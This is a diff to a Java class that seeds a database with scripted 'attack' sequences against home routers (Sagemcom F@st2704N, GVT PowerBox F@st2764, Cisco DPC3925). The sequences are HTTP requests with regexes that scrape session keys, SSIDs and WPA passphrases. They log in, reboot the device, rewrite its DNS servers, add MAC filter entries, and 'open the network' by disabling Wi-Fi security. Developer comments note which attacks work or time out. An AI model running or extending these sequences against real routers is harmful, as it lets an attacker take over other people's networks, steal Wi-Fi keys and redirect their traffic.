+					mParamsProxDao.insert(new Params(91, 243, "WLANCfgAuthenTimeout", "<input type=\"text\" name=\"WLANCfgAuthenTimeout\" size=\"5\" maxlength=\"4\" value=\"(.*?)\" onBlur=chkAuthenTimeout\\(this.form\\) onKeyPress=chk_num\\(event\\);>"));
+					mParamsProxDao.insert(new Params(92, 243, "WLANCfgIdleTimeout", "<input type=\"text\" name=\"WLANCfgIdleTimeout\" size=\"5\" maxlength=\"4\" value=\"(.*?)\" onBlur=chkIdleTimeout\\(this.value\\) onKeyPress=chk_num\\(event\\);>"));
+					mParamsProxDao.insert(new Params(93, 243, "WLANCfgWPATimer", "<input type=\"text\"name=\"WLANCfgWPATimer\" size=\"5\" maxlength=\"5\" value=\"(.*?)\" onKeyPress=chk_num\\(event\\); >"));
+					mParamsProxDao.insert(new Params(94, 243, "WLANCfgRadiusServerAddr", "<input type=\"text\" name=\"WLANCfgRadiusServerAddr\" size=\"15\"  maxlength=\"15\" value=\"(.*?)\" >"));
+					mParamsProxDao.insert(new Params(95, 243, "WLANCfgRadiusServerPort", "<input type=\"text\" name=\"WLANCfgRadiusServerPort\" size=\"5\"  maxlength=\"5\" value=\"(.*?)\" onBlur=checkPort\\(this.value,0\\) onKeyPress=chk_num\\(event\\); >"));
+					mParamsProxDao.insert(new Params(96, 243, "WLANCfgRadiusServerKey", "<input type=\"text\" name=\"WLANCfgRadiusServerKey\" size=\"31\"  maxlength=\"127\" value=\"(.*?)\" >"));
+					mParamsProxDao.insert(new Params(97, 243, "WlanQosFlag", "<input type=\"hidden\" name=\"WlanQosFlag\" value=\"(.*?)\">"));
 			mPostGetDao.insert(new PostGet(244, 23, 11, "get", "/cgi-bin/buttom.asp", "", 0));		
 			mPostGetDao.insert(new PostGet(245, 23, 12, "post", "/cgi-bin/WLAN_General.asp", "", 0));		//TIMEOUT											
 				mParamsDao.insert(new Params(271, 245, "hid_encryptionMode", "inserehid_encryptionMode"));		//1
@@ -892,21 +911,22 @@ public class Initialize {
 				mParamsDao.insert(new Params(303, 245, "doSubmitFlag", "0"));			
 			
 
-//		NET Cisco DPC3925		***DIDNT TEST***
-		mAtaqueDao.insert(new Ataque(24, "abrirrede", "net", 1, "Cisco DPC3925"));			
+//		NET Cisco DPC3925		***DONT WORK***
+		mAtaqueDao.insert(new Ataque(24, "abrirrede", "net", 1, 0, null, 0, "Cisco DPC3925"));			
 			mPostGetDao.insert(new PostGet(246, 24, 1, "post", "/goform/Docsis_system", "Setup", 1));														
 				mParamsDao.insert(new Params(304, 246, "username_login", "insereUsuario"));
 				mParamsDao.insert(new Params(305, 246, "password_login", "insereSenha"));
 				mParamsDao.insert(new Params(306, 246, "LanguageSelect", "en"));
 				mParamsDao.insert(new Params(307, 246, "Language_Submit", "0"));
 				mParamsDao.insert(new Params(308, 246, "login", "Log In"));
-			mPostGetDao.insert(new PostGet(247, 24, 2, "get", "/Quick_setup.asp", "<input type=\"text\" maxlength=\"32\" name=\"ssid\" id=\"ssid\" value=\"(.*?)\" />;;" +
-																				  "<input type=\"password\" class=\"num\" id=\"wpa_psk_key\" name=\"wpa_psk_key\" size=\"32\" maxlength=\"64\" value=\"(.*?)\" onKeyDown=\"keyCheck\\(this\\)\"  onSelect=\"textSelected=true\" />;;" +
-																				  "<input type=\"hidden\" name=\"h_tx_key\" value=\"(.*?)\">\n" +
-																				  "<input type=\"hidden\" name=\"h_setup_wifi_enable\" value=\"(.*?)\">;;" +
-																				  "<input type=\"hidden\" name=\"h_security_mode\" value=\"(.*?)\">;;" +
-																				  "<input type=\"hidden\" name=\"qs_wds_setting\" value=\"(.*?)\" />;;" +
-																				  "<input type=\"hidden\" name=\"UserId\" value=\"(.*?)\">;;", 0));
+			mPostGetDao.insert(new PostGet(247, 24, 2, "get", "/Quick_setup.asp", "", 0));
+					mParamsProxDao.insert(new Params(98, 247, "ssid", "<input type=\"text\" maxlength=\"32\" name=\"ssid\" id=\"ssid\" value=\"(.*?)\" />"));
+					mParamsProxDao.insert(new Params(99, 247, "wpa_psk_key", "<input type=\"password\" class=\"num\" id=\"wpa_psk_key\" name=\"wpa_psk_key\" size=\"32\" maxlength=\"64\" value=\"(.*?)\" onKeyDown=\"keyCheck\\(this\\)\"  onSelect=\"textSelected=true\" />"));
+					mParamsProxDao.insert(new Params(100, 247, "h_tx_key", "<input type=\"hidden\" name=\"h_tx_key\" value=\"(.*?)\">"));
+					mParamsProxDao.insert(new Params(101, 247, "h_setup_wifi_enable", "<input type=\"hidden\" name=\"h_setup_wifi_enable\" value=\"(.*?)\">"));
+					mParamsProxDao.insert(new Params(102, 247, "h_security_mode", "<input type=\"hidden\" name=\"h_security_mode\" value=\"(.*?)\">"));
+					mParamsProxDao.insert(new Params(103, 247, "qs_wds_setting", "<input type=\"hidden\" name=\"qs_wds_setting\" value=\"(.*?)\" />"));
+					mParamsProxDao.insert(new Params(104, 247, "UserId", "<input type=\"hidden\" name=\"UserId\" value=\"(.*?)\">"));
 			mPostGetDao.insert(new PostGet(248, 24, 3, "post", "/goform/Quick_setup", "", 0));														
 				mParamsDao.insert(new Params(309, 248, "Password", ""));
 				mParamsDao.insert(new Params(310, 248, "PasswordReEnter", ""));
@@ -919,7 +939,7 @@ public class Initialize {
 				mParamsDao.insert(new Params(317, 248, "radius_ip_3", "0"));
 				mParamsDao.insert(new Params(318, 248, "radius_ip_4", "0"));
 				mParamsDao.insert(new Params(319, 248, "keysize", "64"));
-				mParamsDao.insert(new Params(320, 248, "tx_key", "inseretx_key"));		//1
+				mParamsDao.insert(new Params(320, 248, "tx_key", "insereh_tx_key"));		//1
 				mParamsDao.insert(new Params(321, 248, "save", "Save Settings"));
 				mParamsDao.insert(new Params(322, 248, "h_setup_wifi_enable", "insereh_setup_wifi_enable"));		//enable
 				mParamsDao.insert(new Params(323, 248, "h_security_mode", "insereh_security_mode"));		//disabled
@@ -932,7 +952,7 @@ public class Initialize {
 				
 		/*******************************************************Start Login*******************************************************/	
 //		Oi Sagemcom F@st2704N			
-		mAtaqueDao.insert(new Ataque(25, "login", "oi", 0, "Sagemcom F@st2704N"));			
+		mAtaqueDao.insert(new Ataque(25, "login", "oi", 0, 0, null, 1, "Sagemcom F@st2704N"));			
 			mPostGetDao.insert(new PostGet(249, 25, 1, "get", "", "DSL Router", 1));
 			mPostGetDao.insert(new PostGet(250, 25, 2, "get", "/main.html", "DSL Router", 1));		
 			mPostGetDao.insert(new PostGet(251, 25, 3, "get", "/logo.html", "", 1));		
@@ -942,7 +962,7 @@ public class Initialize {
 			mPostGetDao.insert(new PostGet(255, 25, 7, "get", "/info.html", "F@ST", 1));		
 			
 //		GVT Sagemcom PowerBox F@st2764		
-		mAtaqueDao.insert(new Ataque(26, "login", "gvt", 0, "Sagemcom PowerBox F@st2764"));			
+		mAtaqueDao.insert(new Ataque(26, "login", "gvt", 0, 0, null, 1, "Sagemcom PowerBox F@st2764"));			
 			mPostGetDao.insert(new PostGet(256, 26, 1, "get", "", "Power Box GVT", 1));					
 			
 		/********************************************************End Login********************************************************/
@@ -950,7 +970,7 @@ public class Initialize {
 		
 		/******************************************************Start Reboot*******************************************************/		
 //		Oi Sagemcom F@st2704N			
-		mAtaqueDao.insert(new Ataque(27, "reboot", "oi", 0, "Sagemcom F@st2704N"));			
+		mAtaqueDao.insert(new Ataque(27, "reboot", "oi", 0, 1, "var sessionKey='719914237'", 1, "Sagemcom F@st2704N"));			
 			mPostGetDao.insert(new PostGet(257, 27, 1, "get", "", "DSL Router", 1));
 			mPostGetDao.insert(new PostGet(258, 27, 2, "get", "/main.html", "DSL Router", 1));		
 			mPostGetDao.insert(new PostGet(259, 27, 3, "get", "/logo.html", "", 1));		
@@ -961,14 +981,18 @@ public class Initialize {
 			mPostGetDao.insert(new PostGet(264, 27, 8, "get", "/wancfg.cmd?action=refresh", "", 1));			
 			mPostGetDao.insert(new PostGet(265, 27, 9, "get", "/backupsettings.html", "Backup", 1));			
 			mPostGetDao.insert(new PostGet(266, 27, 10, "get", "/wancfg.cmd?action=refresh", "", 1));			
-			mPostGetDao.insert(new PostGet(267, 27, 11, "get", "/resetrouter.html", "var sessionKey=\'(.*?)\'", 1));			
+			mPostGetDao.insert(new PostGet(267, 27, 11, "get", "/resetrouter.html", "", 1));	
+					mParamsProxDao.insert(new Params(105, 267, "sessionKey", "var sessionKey=\'(.*?)\'"));
 			mPostGetDao.insert(new PostGet(268, 27, 12, "get", "/rebootinfo.cgi?sessionKey=inseresessionKey", "DSL Reinicialização do roteador", 1));		//719914237				
 
 //		GVT Sagemcom PowerBox F@st2764				
-		mAtaqueDao.insert(new Ataque(28, "reboot", "gvt", 0, "Sagemcom PowerBox F@st2764"));			
-			mPostGetDao.insert(new PostGet(269, 28, 1, "get", "", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />", 1));			
-			mPostGetDao.insert(new PostGet(270, 28, 2, "get", "/index.cgi?page=language&sessionid=inseresessionid", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />", 1));		//8wOy77x8i4I9m679Al3c2MPuP5geQOq			
-			mPostGetDao.insert(new PostGet(271, 28, 3, "get", "/index.cgi?page=resets&sessionid=inseresessionid", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />", 1));		//8wOy77x8i4I9m679Al3c2MPuP5geQOq						
+		mAtaqueDao.insert(new Ataque(28, "reboot", "gvt", 0, 1, "<input type=\"hidden\" name=\"sessionid\" value=\"8wOy77x8i4I9m679Al3c2MPuP5geQOq\" />", 0, "Sagemcom PowerBox F@st2764"));			
+			mPostGetDao.insert(new PostGet(269, 28, 1, "get", "", "", 1));			
+					mParamsProxDao.insert(new Params(106, 269, "sessionid", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />"));
+			mPostGetDao.insert(new PostGet(270, 28, 2, "get", "/index.cgi?page=language&sessionid=inseresessionid", "", 1));		//8wOy77x8i4I9m679Al3c2MPuP5geQOq		
+					mParamsProxDao.insert(new Params(107, 270, "sessionid", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />"));
+			mPostGetDao.insert(new PostGet(271, 28, 3, "get", "/index.cgi?page=resets&sessionid=inseresessionid", "", 1));		//8wOy77x8i4I9m679Al3c2MPuP5geQOq	
+					mParamsProxDao.insert(new Params(108, 271, "sessionid", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />"));
 			mPostGetDao.insert(new PostGet(272, 28, 4, "post", "/index.cgi", "", 2));			
 				mParamsDao.insert(new Params(327, 272, "page", "resets"));		
 				mParamsDao.insert(new Params(328, 272, "sessionid", "inseresessionid"));		//8wOy77x8i4I9m679Al3c2MPuP5geQOq						
@@ -982,7 +1006,7 @@ public class Initialize {
 		
 		/********************************************************Start DNS********************************************************/
 //		Oi Sagemcom F@st2704N			
-		mAtaqueDao.insert(new Ataque(29, "dns", "oi", 0, "Sagemcom F@st2704N"));			
+		mAtaqueDao.insert(new Ataque(29, "dns", "oi", 0, 1, "var sessionKey='844646178'", 1, "Sagemcom F@st2704N"));			
 			mPostGetDao.insert(new PostGet(273, 29, 1, "get", "", "DSL Router", 1));
 			mPostGetDao.insert(new PostGet(274, 29, 2, "get", "/main.html", "DSL Router", 1));		
 			mPostGetDao.insert(new PostGet(275, 29, 3, "get", "/logo.html", "", 1));		
@@ -992,14 +1016,17 @@ public class Initialize {
 			mPostGetDao.insert(new PostGet(279, 29, 7, "get", "/info.html", "F@ST", 1));			
 			mPostGetDao.insert(new PostGet(280, 29, 8, "get", "/wancfg.cmd?action=refresh", "", 1));
 			mPostGetDao.insert(new PostGet(281, 29, 9, "get", "/dslatm.cmd", "", 1));
-			mPostGetDao.insert(new PostGet(282, 29, 10, "get", "/dnscfg.html", "var sessionKey=\'(.*?)\'", 1));
+			mPostGetDao.insert(new PostGet(282, 29, 10, "get", "/dnscfg.html", "", 1));
+					mParamsProxDao.insert(new Params(109, 282, "sessionKey", "var sessionKey=\'(.*?)\'"));
 			mPostGetDao.insert(new PostGet(283, 29, 11, "get", "/wancfg.cmd?action=refresh", "", 1));
-			mPostGetDao.insert(new PostGet(284, 29, 12, "get", "/dnscfg.cgi?dnsPrimary=8.8.8.8&dnsSecondary=8.8.4.4&dnsIfcsList=&dnsRefresh=1&sessionKey=inseresessionKey", "var sessionKey=\'(.*?)\'", 1));		//844646178
+			mPostGetDao.insert(new PostGet(284, 29, 12, "get", "/dnscfg.cgi?dnsPrimary=8.8.8.8&dnsSecondary=8.8.4.4&dnsIfcsList=&dnsRefresh=1&sessionKey=inseresessionKey", "", 1));		//844646178
+					mParamsProxDao.insert(new Params(110, 284, "sessionKey", "var sessionKey=\'(.*?)\'"));
 			mPostGetDao.insert(new PostGet(285, 29, 13, "get", "/dnscfg.cgi?dnsRefresh=0&sessionKey=inseresessionKey", "", 1));		//1828718257
 			mPostGetDao.insert(new PostGet(286, 29, 14, "get", "/wancfg.cmd?action=refresh", "", 1));
 			mPostGetDao.insert(new PostGet(287, 29, 15, "get", "/backupsettings.html", "Backup", 1));			
 			mPostGetDao.insert(new PostGet(288, 29, 16, "get", "/wancfg.cmd?action=refresh", "", 1));			
-			mPostGetDao.insert(new PostGet(289, 29, 17, "get", "/resetrouter.html", "var sessionKey=\'(.*?)\'", 1));					
+			mPostGetDao.insert(new PostGet(289, 29, 17, "get", "/resetrouter.html", "", 1));				
+					mParamsProxDao.insert(new Params(111, 289, "sessionKey", "var sessionKey=\'(.*?)\'"));
 			mPostGetDao.insert(new PostGet(290, 29, 18, "get", "/rebootinfo.cgi?sessionKey=inseresessionKey", "DSL Reinicialização do roteador", 1));		//719914237			
 				
 		/*********************************************************End DNS*********************************************************/
@@ -1011,7 +1038,7 @@ public class Initialize {
 		
 		/*****************************************************Start Filtro MAC****************************************************/	
 //		Oi Sagemcom F@st2704N		***DONT WORK***			
-		mAtaqueDao.insert(new Ataque(30, "filtromac", "oi", 0, "Sagemcom F@st2704N"));			
+		mAtaqueDao.insert(new Ataque(30, "filtromac", "oi", 0, 1, "loc += '&sessionKey=203034290'; || var sessionKey='1603439650'", 1, "Sagemcom F@st2704N"));			
 			mPostGetDao.insert(new PostGet(291, 30, 1, "get", "", "DSL Router", 1));
 			mPostGetDao.insert(new PostGet(292, 30, 2, "get", "/main.html", "DSL Router", 1));		
 			mPostGetDao.insert(new PostGet(293, 30, 3, "get", "/logo.html", "", 1));		
@@ -1023,35 +1050,45 @@ public class Initialize {
 			mPostGetDao.insert(new PostGet(300, 30, 9, "get", "/wlswitchinterface0.wl", "", 1));		
 			mPostGetDao.insert(new PostGet(301, 30, 10, "get", "/wancfg.cmd?action=refresh", "", 1));		
 			mPostGetDao.insert(new PostGet(302, 30, 11, "get", "/wlmacflt.cmd?action=view", "", 1));		
-			mPostGetDao.insert(new PostGet(303, 30, 12, "get", "/wlmacflt.html", "loc \\+= \'&sessionKey=(.*?)\';", 1));
+			mPostGetDao.insert(new PostGet(303, 30, 12, "get", "/wlmacflt.html", "", 1));
+					mParamsProxDao.insert(new Params(112, 303, "sessionKey", "loc \\+= \'&sessionKey=(.*?)\';"));
 			mPostGetDao.insert(new PostGet(304, 30, 13, "get", "/wancfg.cmd?action=refresh", "", 1));	
 			mPostGetDao.insert(new PostGet(305, 30, 14, "get", "/wlmacflt.cmd?action=add&wlFltMacAddr=90:00:4E:AC:F6:B5&wlSyncNvram=1&sessionKey=inseresessionKey", "", 1));		//203034290	
-			mPostGetDao.insert(new PostGet(306, 30, 15, "get", "/wancfg.cmd?action=refresh", "", 1));		//TIMEOUT	
-			mPostGetDao.insert(new PostGet(307, 30, 16, "get", "/wlmacflt.cmd?action=view", "loc \\+= \'&sessionKey=(.*?)\';", 1));	
+			mPostGetDao.insert(new PostGet(306, 30, 15, "get", "/wancfg.cmd?action=refresh", "", 1));			
+			mPostGetDao.insert(new PostGet(307, 30, 16, "get", "/wlmacflt.cmd?action=view", "", 1));		//TIMEOUT	
+					mParamsProxDao.insert(new Params(113, 307, "sessionKey", "loc \\+= \'&sessionKey=(.*?)\';"));
 			mPostGetDao.insert(new PostGet(308, 30, 17, "get", "/wlmacflt.cmd?action=refresh&sessionKey=inseresessionKey", "", 1));		//811539311	
 			mPostGetDao.insert(new PostGet(309, 30, 18, "get", "/wancfg.cmd?action=refresh", "", 1));	
-			mPostGetDao.insert(new PostGet(310, 30, 19, "get", "/wlmacflt.html", "loc \\+= \'&sessionKey=(.*?)\';", 1));	
+			mPostGetDao.insert(new PostGet(310, 30, 19, "get", "/wlmacflt.html", "", 1));	
+					mParamsProxDao.insert(new Params(114, 310, "sessionKey", "loc \\+= \'&sessionKey=(.*?)\';"));
 			mPostGetDao.insert(new PostGet(311, 30, 20, "get", "/wancfg.cmd?action=refresh", "", 1));	
 			mPostGetDao.insert(new PostGet(312, 30, 21, "get", "/wlmacflt.cmd?action=add&wlFltMacAddr=insereMAC&wlSyncNvram=1&sessionKey=inseresessionKey", "", 1));		//34:BB:26:60:62:0D		//1040120023	
 			mPostGetDao.insert(new PostGet(313, 30, 22, "get", "/wancfg.cmd?action=refresh", "", 1));	
-			mPostGetDao.insert(new PostGet(314, 30, 23, "get", "/wlmacflt.cmd?action=view", "loc \\+= \'&sessionKey=(.*?)\';", 1));   	
+			mPostGetDao.insert(new PostGet(314, 30, 23, "get", "/wlmacflt.cmd?action=view", "", 1)); 
+					mParamsProxDao.insert(new Params(115, 314, "sessionKey", "loc \\+= \'&sessionKey=(.*?)\';"));
 			mPostGetDao.insert(new PostGet(315, 30, 24, "get", "/wancfg.cmd?action=refresh", "", 1));
 			mPostGetDao.insert(new PostGet(316, 30, 25, "get", "/wlmacflt.cmd?action=save&wlFltMacMode=allow&sessionKey=inseresessionKey", "", 1));		//1102973013
 			mPostGetDao.insert(new PostGet(317, 30, 26, "get", "/wancfg.cmd?action=refresh", "", 1));
-			mPostGetDao.insert(new PostGet(318, 30, 27, "get", "/wlmacflt.cmd?action=view", "loc \\+= \'&sessionKey=(.*?)\';", 1));
+			mPostGetDao.insert(new PostGet(318, 30, 27, "get", "/wlmacflt.cmd?action=view", "", 1));
+					mParamsProxDao.insert(new Params(116, 318, "sessionKey", "loc \\+= \'&sessionKey=(.*?)\';"));
 			mPostGetDao.insert(new PostGet(319, 30, 28, "get", "/wlmacflt.cmd?action=refresh&sessionKey=inseresessionKey", "", 1));		//1485002985
 			mPostGetDao.insert(new PostGet(320, 30, 29, "get", "/wancfg.cmd?action=refresh", "", 1));			
 			mPostGetDao.insert(new PostGet(321, 30, 30, "get", "/backupsettings.html", "Backup", 1));			
 			mPostGetDao.insert(new PostGet(322, 30, 31, "get", "/wancfg.cmd?action=refresh", "", 1));			
-			mPostGetDao.insert(new PostGet(323, 30, 32, "get", "/resetrouter.html", "var sessionKey=\'(.*?)\'", 1));			
+			mPostGetDao.insert(new PostGet(323, 30, 32, "get", "/resetrouter.html", "", 1));
+					mParamsProxDao.insert(new Params(117, 323, "sessionKey", "var sessionKey=\'(.*?)\'"));
 			mPostGetDao.insert(new PostGet(324, 30, 33, "get", "/rebootinfo.cgi?sessionKey=inseresessionKey", "DSL Reinicialização do roteador", 1));		//1603439650
 
 //		GVT Sagemcom PowerBox F@st2764		***DONT WORK***				
-		mAtaqueDao.insert(new Ataque(31, "filtromac", "gvt", 0, "Sagemcom PowerBox F@st2764"));			
-			mPostGetDao.insert(new PostGet(325, 31, 1, "get", "", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />", 1));	
-			mPostGetDao.insert(new PostGet(326, 31, 2, "get", "/index.cgi?page=internet&sessionid=inseresessionid", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />", 1));		//TcHtrepEP3LHAJ7vSZ35YObDDy5Pusc	
-			mPostGetDao.insert(new PostGet(327, 31, 3, "get", "/index.cgi?page=wifi&sessionid=inseresessionid", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />", 1));		//TcHtrepEP3LHAJ7vSZ35YObDDy5Pusc	
-			mPostGetDao.insert(new PostGet(328, 31, 4, "get", "/index.cgi?page=macfilter&sessionid=inseresessionid", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />", 1));		//TcHtrepEP3LHAJ7vSZ35YObDDy5Pusc	
+		mAtaqueDao.insert(new Ataque(31, "filtromac", "gvt", 0, 1, "<input type=\"hidden\" name=\"sessionid\" value=\"TcHtrepEP3LHAJ7vSZ35YObDDy5Pusc\" />", 0, "Sagemcom PowerBox F@st2764"));			
+			mPostGetDao.insert(new PostGet(325, 31, 1, "get", "", "", 1));	
+					mParamsProxDao.insert(new Params(118, 325, "sessionid", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />"));
+			mPostGetDao.insert(new PostGet(326, 31, 2, "get", "/index.cgi?page=internet&sessionid=inseresessionid", "", 1));		//TcHtrepEP3LHAJ7vSZ35YObDDy5Pusc	
+					mParamsProxDao.insert(new Params(119, 326, "sessionid", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />"));
+			mPostGetDao.insert(new PostGet(327, 31, 3, "get", "/index.cgi?page=wifi&sessionid=inseresessionid", "", 1));		//TcHtrepEP3LHAJ7vSZ35YObDDy5Pusc	
+					mParamsProxDao.insert(new Params(120, 327, "sessionid", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />"));
+			mPostGetDao.insert(new PostGet(328, 31, 4, "get", "/index.cgi?page=macfilter&sessionid=inseresessionid", "", 1));		//TcHtrepEP3LHAJ7vSZ35YObDDy5Pusc	
+					mParamsProxDao.insert(new Params(121, 328, "sessionid", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />"));
 			mPostGetDao.insert(new PostGet(329, 31, 5, "post", "/index.cgi", "", 2));		//TIMEOUT		
 				mParamsDao.insert(new Params(333, 329, "page", "macfilter"));		
 				mParamsDao.insert(new Params(334, 329, "sessionid", "inseresessionid"));		//TcHtrepEP3LHAJ7vSZ35YObDDy5Pusc					
@@ -1067,9 +1104,12 @@ public class Initialize {
 				mParamsDao.insert(new Params(344, 329, "device1", "2"));		
 				mParamsDao.insert(new Params(345, 329, "device2", "-1"));		
 				mParamsDao.insert(new Params(346, 329, "mac2", "90:00:4e:ac:f6:b5"));
-			mPostGetDao.insert(new PostGet(330, 31, 6, "get", "/index.cgi", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />", 1));
-			mPostGetDao.insert(new PostGet(331, 31, 7, "get", "/index.cgi?page=language&sessionid=inseresessionid", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />", 1));		//8I2jYz5wuVo6rgcFI2TyI3sm3gazrp7			
-			mPostGetDao.insert(new PostGet(332, 31, 8, "get", "/index.cgi?page=resets&sessionid=inseresessionid", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />", 1));		//8I2jYz5wuVo6rgcFI2TyI3sm3gazrp7						
+			mPostGetDao.insert(new PostGet(330, 31, 6, "get", "/index.cgi", "", 1));
+					mParamsProxDao.insert(new Params(122, 330, "sessionid", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />"));
+			mPostGetDao.insert(new PostGet(331, 31, 7, "get", "/index.cgi?page=language&sessionid=inseresessionid", "", 1));		//8I2jYz5wuVo6rgcFI2TyI3sm3gazrp7	
+					mParamsProxDao.insert(new Params(123, 331, "sessionid", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />"));		
+			mPostGetDao.insert(new PostGet(332, 31, 8, "get", "/index.cgi?page=resets&sessionid=inseresessionid", "", 1));		//8I2jYz5wuVo6rgcFI2TyI3sm3gazrp7	
+					mParamsProxDao.insert(new Params(124, 332, "sessionid", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />"));					
 			mPostGetDao.insert(new PostGet(333, 31, 9, "post", "/index.cgi", "", 2));			
 				mParamsDao.insert(new Params(347, 333, "page", "resets"));		
 				mParamsDao.insert(new Params(348, 333, "sessionid", "inseresessionid"));		//8I2jYz5wuVo6rgcFI2TyI3sm3gazrp7						
@@ -1082,8 +1122,8 @@ public class Initialize {
 		
 		
 		/******************************************************Start Abrir Rede*****************************************************/		
-//		Oi Sagemcom F@st2704N		***WORK BUT TIMEOUT***			
-		mAtaqueDao.insert(new Ataque(32, "abrirrede", "oi", 0, "Sagemcom F@st2704N"));			
+//		Oi Sagemcom F@st2704N					
+		mAtaqueDao.insert(new Ataque(32, "abrirrede", "oi", 0, 1, "sessionKey='1045733513'", 1, "Sagemcom F@st2704N"));			
 			mPostGetDao.insert(new PostGet(353, 32, 1, "get", "", "DSL Router", 1));
 			mPostGetDao.insert(new PostGet(354, 32, 2, "get", "/main.html", "DSL Router", 1));		
 			mPostGetDao.insert(new PostGet(355, 32, 3, "get", "/logo.html", "", 1));		
@@ -1094,13 +1134,14 @@ public class Initialize {
 			mPostGetDao.insert(new PostGet(360, 32, 8, "get", "/wancfg.cmd?action=refresh", "", 1));
 			mPostGetDao.insert(new PostGet(361, 32, 9, "get", "/wlswitchinterface0.wl", "", 1));
 			mPostGetDao.insert(new PostGet(362, 32, 10, "get", "/wancfg.cmd?action=refresh", "", 1));
-			mPostGetDao.insert(new PostGet(363, 32, 11, "get", "/wlsecurity.html", "WscMode       = \'(.*?)\';;" +
-																				   "WscIRMode   = \'(.*?)\';;" +
-																				   "WscAPMode  = \'(.*?)\';;" +
-																				   "wep = \'(.*?)\';;" +
-																				   "wpa = \'(.*?)\';;" +
-																				   "ssidIdx = \'(.*?)\';;" +
-																				   "sessionKey=\'(.*?)\'", 1));
+			mPostGetDao.insert(new PostGet(363, 32, 11, "get", "/wlsecurity.html", "", 1));
+					mParamsProxDao.insert(new Params(125, 363, "WscMode", "WscMode       = \'(.*?)\'"));
+					mParamsProxDao.insert(new Params(126, 363, "WscIRMode", "WscIRMode   = \'(.*?)\'"));
+					mParamsProxDao.insert(new Params(127, 363, "WscAPMode", "WscAPMode  = \'(.*?)\'"));
+					mParamsProxDao.insert(new Params(128, 363, "wep", "wep = \'(.*?)\'"));
+					mParamsProxDao.insert(new Params(129, 363, "wpa", "wpa = \'(.*?)\'"));
+					mParamsProxDao.insert(new Params(130, 363, "ssidIdx", "ssidIdx = \'(.*?)\'"));
+					mParamsProxDao.insert(new Params(131, 363, "sessionKey", "sessionKey=\'(.*?)\'"));
 			mPostGetDao.insert(new PostGet(364, 32, 12, "get", "/wancfg.cmd?action=refresh", "", 1));
 			mPostGetDao.insert(new PostGet(365, 32, 13, "get", "/wlsecurity.wl?wl_wsc_mode=insereWscMode" +		//enabled
 																			 "&wl_wsc_reg=insereWscIRMode" +		//enabled
@@ -1114,30 +1155,32 @@ public class Initialize {
 																			 "&wlSsidIdx=inseressidIdx" +		//0
 																			 "&wlSyncNvram=1" +
 																			 "&sessionKey=inseresessionKey", "", 1));		//1045733513
-			mPostGetDao.insert(new PostGet(366, 32, 14, "get", "/wancfg.cmd?action=refresh", "", 1));
-			mPostGetDao.insert(new PostGet(368, 32, 15, "get", "/wlsecrefresh.wl?wlRefresh=0", "", 1));		//TIMEOUT		
+			mPostGetDao.insert(new PostGet(366, 32, 14, "get", "/wancfg.cmd?action=refresh", "", 1));		//TIMEOUT	
 
-//		GVT Sagemcom PowerBox F@st2764		***WORK BUT TIMEOUT***						
-		mAtaqueDao.insert(new Ataque(33, "abrirrede", "gvt", 0, "Sagemcom PowerBox F@st2764"));			
-			mPostGetDao.insert(new PostGet(369, 33, 1, "get", "", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />", 1));			
-			mPostGetDao.insert(new PostGet(370, 33, 2, "get", "/index.cgi?page=internet&sessionid=inseresessionid", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />", 1));		//LYV3asCclcVeD8hLhP5zOvFO7DlO2d9
-			mPostGetDao.insert(new PostGet(371, 33, 3, "get", "/index.cgi?page=wifi&sessionid=inseresessionid", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />;;" +
-																												"<input type=\"text\" name=\"ssid\" autocomplete=\"off\" value=\"(.*?)\" maxlength=\"32\" style=\"width: 168px; background-color: #FFFFFF\" onchange=\"UpdateForm\\(\\)\" onkeyup=\"UpdateForm\\(\\)\" title=\"Input Guest SSID\" />;;", 1));		//LYV3asCclcVeD8hLhP5zOvFO7DlO2d9
-			mPostGetDao.insert(new PostGet(372, 33, 4, "post", "/index.cgi", "", 2));		//TIMEOUT			
-				mParamsDao.insert(new Params(353, 372, "page", "wifi"));		
-				mParamsDao.insert(new Params(354, 372, "sessionid", "inseresessionid"));		//LYV3asCclcVeD8hLhP5zOvFO7DlO2d9						
-				mParamsDao.insert(new Params(355, 372, "action", "submit"));		
-				mParamsDao.insert(new Params(356, 372, "update", "1"));		
-				mParamsDao.insert(new Params(357, 372, "wifistatus", "1"));		
-				mParamsDao.insert(new Params(358, 372, "broadcast", "1"));				
-				mParamsDao.insert(new Params(359, 372, "ssid", "inseressid"));		//GVT-58B2		
-				mParamsDao.insert(new Params(360, 372, "securitymode", "0"));		
-				mParamsDao.insert(new Params(361, 372, "Gvtpincode", ""));		
-				mParamsDao.insert(new Params(362, 372, "mode", "6"));		//Auto B/G/N	
-				mParamsDao.insert(new Params(363, 372, "channel", "-1"));		//Auto		
-				mParamsDao.insert(new Params(364, 372, "transpower", "100"));	
-				mParamsDao.insert(new Params(365, 372, "statuswmm", "1"));			
-				mParamsDao.insert(new Params(366, 372, "statusapsd", "1"));	
+//		GVT Sagemcom PowerBox F@st2764								
+		mAtaqueDao.insert(new Ataque(33, "abrirrede", "gvt", 0, 1, "<input type=\"hidden\" name=\"sessionid\" value=\"LYV3asCclcVeD8hLhP5zOvFO7DlO2d9\" />", 0, "Sagemcom PowerBox F@st2764"));			
